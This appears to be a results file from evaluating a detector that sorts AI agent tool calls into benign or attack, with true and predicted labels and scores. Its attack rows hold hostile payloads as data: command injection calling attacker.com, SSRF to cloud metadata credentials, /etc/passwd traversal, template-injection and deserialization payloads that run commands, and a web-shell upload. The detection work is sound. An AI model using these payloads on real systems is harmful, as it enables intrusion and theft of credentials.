+s3_operation,"{""operation"": ""delete"", ""bucket"": ""temp"", ""key"": ""cache/old.json""}",benign,benign,0.8161832069997983,0.016948342323303223,0.026297330856323242
+s3_operation,"{""operation"": ""get"", ""bucket"": ""documents"", ""key"": ""reports/annual.pdf""}",benign,attack,0.6206966025072341,0.0449826717376709,0.037382423877716064
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user123/photo.jpg""}",benign,benign,0.8277245673766931,0.01975429058074951,0.03140437602996826
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""cache/old.json"", ""prefix"": ""im",benign,attack,0.5162599891442409,0.02704387903213501,0.026379764080047607
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""prefix"": ""images/"", ""key"": ""user16/fi",benign,attack,0.6988332292797557,0.014602720737457275,0.019838154315948486
+s3_operation,"{""operation"": ""get"", ""bucket"": ""my-app-data"", ""key"": ""uploads/file.pdf""}",benign,attack,0.6035898218821248,0.020058870315551758,0.023509323596954346
+s3_operation,"{""operation"": ""put"", ""bucket"": ""uploads"", ""key"": ""user0/file.txt""}",benign,benign,1.0,0.00865703821182251,0.021077275276184082
+s3_operation,"{""operation"": ""head"", ""bucket"": ""assets"", ""key"": ""logo.png""}",benign,attack,0.5114552750763705,0.0337449312210083,0.03434121608734131
+s3_operation,"{""operation"": ""list"", ""bucket"": ""assets"", ""key"": ""uploads/file.pdf"", ""prefix"": """,benign,attack,0.524587462906356,0.03426390886306763,0.032999515533447266
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-8"", ""key"": ""files/doc28.pdf""}",benign,benign,0.9860978587979538,0.009745776653289795,0.02200448513031006
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-0"", ""key"": ""files/doc20.pdf""}",benign,benign,0.877969323659081,0.011763930320739746,0.020821750164031982
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""prefix"": ""images/"", ""key"": ""reports/rep",benign,attack,0.5851386330251523,0.02924567461013794,0.02567112445831299
+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,benign,1.0,0.008625686168670654,0.02161937952041626
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,attack,0.5342689020924077,0.024979114532470703,0.02632319927215576
+s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,attack,0.5181403224856369,0.030434250831604004,0.029601633548736572
+s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.5371509446060994,0.03247493505477905,0.030681133270263672
+s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,attack,0.6218188197338819,0.03700214624404907,0.030697107315063477
+s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,attack,0.6403294606796118,0.05092477798461914,0.04105657339096069
+s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"":",attack,attack,0.8315795826148915,0.052080750465393066,0.03249478340148926
+s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": """,attack,attack,0.661508325411555,0.027743995189666748,0.021645545959472656
+s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://atta",attack,attack,0.6659660223508006,0.0547831654548645,0.042446255683898926
+s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.9930018675266828,0.08859467506408691,0.0386049747467041
+send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,benign,0.8631364337757554,0.011098861694335938,0.019025743007659912
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,benign,0.8903314545639138,0.008906781673431396,0.016194462776184082
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,benign,0.8801795992439649,0.007758617401123047,0.01379847526550293
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,benign,0.8385835571207982,0.007917344570159912,0.012879014015197754
+send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,benign,0.933821273102446,0.0078391432762146,0.015695512294769287
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,benign,0.9330812311360412,0.008410036563873291,0.01681053638458252
+send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,benign,0.9287053932496783,0.009089648723602295,0.017991304397583008
+send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Mess",benign,attack,0.5252984329847317,0.017778456211090088,0.018338501453399658
+send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,benign,0.9378564440343414,0.007905364036560059,0.01597273349761963
+send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,attack,0.5970737545214004,0.010936439037322998,0.012320220470428467
+send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event",benign,attack,0.6017009469160135,0.01590782403945923,0.01802295446395874
+send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,benign,0.9534234138582166,0.00849682092666626,0.01778566837310791
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}",benign,benign,0.9599867640196915,0.008539795875549316,0.018146514892578125
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}",benign,benign,0.9078567132221087,0.008444249629974365,0.01595604419708252
+send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,benign,0.920100987406461,0.00876307487487793,0.017014503479003906
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,benign,0.8845515579961915,0.00788801908493042,0.014162540435791016
+send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,benign,0.9158009371121023,0.008697152137756348,0.01672571897506714
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,benign,0.9006145718130134,0.007278025150299072,0.013534605503082275
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,benign,0.8958659216516638,0.0073430538177490234,0.013513922691345215
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,benign,0.9064522376449835,0.007300615310668945,0.013752341270446777
+send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,benign,0.7425535647035313,0.012073397636413574,0.016087889671325684
+send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,benign,0.9101948442952565,0.009349644184112549,0.017758429050445557
+send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Ale",benign,attack,0.5572127075082234,0.024079442024230957,0.022447824478149414
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,benign,0.9118814182027224,0.007034718990325928,0.013411521911621094
+send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.5094468651736552,0.011999547481536865,0.012139320373535156
+send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,1.0,0.055831730365753174,0.046882808208465576
+send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.8259987754757815,0.0357399582862854,0.022563457489013672
+send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}",attack,attack,0.8899219557397093,0.028744161128997803,0.0158231258392334
+send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""pa",attack,attack,0.7786550588091472,0.03601574897766113,0.025097548961639404
+send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,attack,0.7365937583060458,0.02493607997894287,0.018942534923553467
+send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,1.0,0.04769796133041382,0.041460633277893066
+send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,attack,0.5124747051145379,0.01654273271560669,0.016797661781311035
+render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,benign,0.9431451427763211,0.010350704193115234,0.02116525173187256
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,benign,1.0,0.008243799209594727,0.021147847175598145
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,attack,0.5464727409372317,0.02736419439315796,0.02871263027191162
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,attack,0.5314614685261504,0.027337968349456787,0.028242766857147217
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,attack,0.531627141408192,0.02817404270172119,0.029111504554748535
+render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": """,benign,benign,0.8597454327462632,0.0259019136428833,0.04407918453216553
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,attack,0.6008000747759119,0.017260193824768066,0.01915973424911499
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,benign,0.962557025182169,0.011466264724731445,0.024509549140930176
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,attack,0.5998750166041836,0.01624429225921631,0.018014729022979736
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,benign,1.0,0.008630752563476562,0.02071237564086914
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,benign,1.0,0.009721159934997559,0.023753643035888672
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,benign,0.9945492578590813,0.008827388286590576,0.02033233642578125
+render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123",benign,attack,0.5118879286025524,0.025954008102416992,0.026275277137756348
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,attack,0.534672529086595,0.028157532215118408,0.02918630838394165
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,benign,1.0,0.009788215160369873,0.02379518747329712
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,attack,0.5304136110261624,0.025821924209594727,0.026647627353668213
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,attack,0.53494944505009,0.01767897605895996,0.018330156803131104
+render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""i",benign,attack,0.5194087702412321,0.03545612096786499,0.034751057624816895
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,attack,0.6097606722243067,0.016995608806610107,0.01904231309890747
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,attack,0.5754133621881665,0.01641261577606201,0.017745494842529297
+render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome""",benign,benign,0.7217088559352377,0.033743441104888916,0.043095409870147705
+render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,attack,0.7344998840170679,0.04074108600616455,0.031081020832061768
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,attack,0.5460158881295369,0.026612520217895508,0.027910709381103516
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,attack,0.6170403314165906,0.01643657684326172,0.01855570077896118
+render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",attack,attack,0.7874945514188381,0.056854188442230225,0.038900673389434814
+render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.6297763888811706,0.018109500408172607,0.02071666717529297
+render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,benign,0.7174193998493459,0.02146965265274048,0.027182340621948242
+render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.",attack,attack,1.0,0.08247828483581543,0.06160426139831543
+render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.requ",attack,attack,0.778537606879559,0.056118130683898926,0.03911536931991577
+render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,attack,0.9327271626144573,0.045954108238220215,0.023008406162261963
+render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')",attack,attack,0.8413423599208228,0.05738335847854614,0.03507035970687866
+render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,attack,0.7709601402279465,0.057619333267211914,0.0407944917678833
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,benign,1.0,0.011549890041351318,0.0431634783744812
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,benign,1.0,0.013734102249145508,0.045473456382751465
+deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,attack,0.5103149030333961,0.04949319362640381,0.05104881525039673
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,benign,1.0,0.01359635591506958,0.04443925619125366
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,benign,1.0,0.00853276252746582,0.04202139377593994
+deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,attack,0.5238312403268006,0.08342897891998291,0.08961474895477295
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,benign,1.0,0.008299291133880615,0.0428047776222229
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,benign,1.0,0.010958552360534668,0.042804837226867676
+deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,attack,0.6371269008888794,0.018936634063720703,0.028744101524353027
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,benign,1.0,0.007828235626220703,0.04035001993179321
+deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,attack,0.6666873473149242,0.020351290702819824,0.03392106294631958
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,benign,1.0,0.008569121360778809,0.03991788625717163
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,benign,1.0,0.013553440570831299,0.03635692596435547
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,benign,1.0,0.008539915084838867,0.04056042432785034
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,benign,1.0,0.016066014766693115,0.037926435470581055
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,benign,1.0,0.007938623428344727,0.042177557945251465
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,benign,0.9790624848602945,0.016940712928771973,0.037624239921569824
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,benign,1.0,0.011901319026947021,0.04520481824874878
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,benign,1.0,0.012842833995819092,0.04367917776107788
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,benign,1.0,0.015298604965209961,0.04101204872131348
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,benign,1.0,0.01531141996383667,0.03808814287185669
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,benign,0.9878308199893937,0.01641237735748291,0.03720802068710327
+deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,attack,0.5841378827641002,0.0270535945892334,0.034868597984313965
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,benign,1.0,0.008244872093200684,0.04164481163024902
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,benign,1.0,0.01972717046737671,0.04617202281951904
+deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');",attack,attack,0.5628037110121465,0.03356438875198364,0.0405460000038147
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat',",attack,attack,0.5862310465768378,0.05576878786087036,0.042994141578674316
+deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.5197259176990854,0.03446841239929199,0.03657037019729614
+deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,attack,1.0,0.12575697898864746,0.04439324140548706
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,attack,0.5016168618089375,0.04436290264129639,0.044578611850738525
+deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlF",attack,attack,1.0,0.20974701642990112,0.08404064178466797
+deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/ob",attack,attack,0.5647701518491616,0.07373279333114624,0.060674428939819336
